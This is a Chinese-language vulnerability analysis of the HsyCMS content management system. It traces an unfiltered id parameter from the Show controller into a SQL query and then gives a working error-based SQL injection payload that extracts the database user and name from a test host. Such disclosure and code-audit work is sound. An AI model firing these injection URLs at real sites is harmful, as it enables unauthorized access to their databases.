一、Cms初识：

Hsycms是由ThinkPHP5.0框架开发的，支持全站生成 PC 纯静态和手机纯静态，手机支持绑定二级域名，以及伪静态两种访问方式，可自定义 URL 网址等功能。所有环境必须支持PHP+MYSQL5.0,PHP必须大于5.4 否则无法运行，环境必须支持伪静态功能。

二、漏洞描述：

prevNext()函数中，直接将接收到的传参，没有经过任何的过滤，直接作为where条件带入执行，从而造成SQL注入漏洞。




三、漏洞分析过程：

定位到漏洞代码：/app/index/common.php

这里直接将$id传参，带入到where()方法进行执行，没有经过过滤，所以导致SQL注入，


搜索发现，/app/index/controller/Show.php里面的index()方法调用了此方法，跟进：

可以看到$id参数用input()方法接收之后，直接就传入prevNext()函数执行了


那么我们来看一下路由定义规则：/app/route.php

这里首先查询了nav表和cate表的entitle字段，如果有带有id进行访问，会访问到index/Show/index方法


表字段如下：


所以我们访问方式，类似下面的即可：


http://www.hsycms.test/news/151




四、漏洞利用：

访问页面：


随便输入个单引号测试一下，报错了，并且可以看到当前执行的SQL语句为：


SELECT `id`,`title` FROM `sy_article` WHERE ( id < 151' and nid=2 and cid=18 ) ORDER BY `id` DESC LIMIT 1



那么我们直接构造闭合即可：


http://www.hsycms.test/news/151)--+


然后构造报错注入payload：


http://www.hsycms.test/news/151) and (select 1 from (select count(*),concat(user(),0x7e,database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+


成功注入出数据库名和数据库用户名


可以看到此时执行SQL语句为：


SELECT `id`,`title` FROM `sy_article` WHERE ( id < 151) and (select 1 from (select count(*),concat(user(),0x7e,database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- and nid=2 and cid=18 ) ORDER BY `id` DESC LIMIT 1
